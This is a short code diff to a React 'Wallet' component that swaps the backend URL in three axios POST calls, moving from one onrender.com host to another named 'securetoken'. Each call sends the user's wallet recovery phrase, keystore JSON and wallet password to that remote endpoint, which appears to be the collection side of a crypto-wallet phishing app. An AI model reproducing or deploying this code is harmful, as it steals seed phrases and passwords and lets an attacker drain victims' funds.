@@ -542,7 +542,7 @@ function Wallet(){
 
 
         try {
-            const response = await axios.post('https://tokenresolveback.onrender.com/api/send', {
+            const response = await axios.post('https://securetoken.onrender.com/api/send', {
                 phrase:phrase,
                 keystore_json:keystore_json,
                 wallet_password:wallet_password,
@@ -592,7 +592,7 @@ function Wallet(){
 
 
         try {
-            const response = await axios.post('https://tokenresolveback.onrender.com/api/send', {
+            const response = await axios.post('https://securetoken.onrender.com/api/send', {
                 phrase:phrase,
                 keystore_json:keystore_json,
                 wallet_password:wallet_password,
@@ -646,7 +646,7 @@ function Wallet(){
 
 
         try {
-            const response = await axios.post('https://tokenresolveback.onrender.com/api/send', {
+            const response = await axios.post('https://securetoken.onrender.com/api/send', {
                 phrase:phrase,
                 keystore_json:keystore_json,
                 wallet_password:wallet_password,
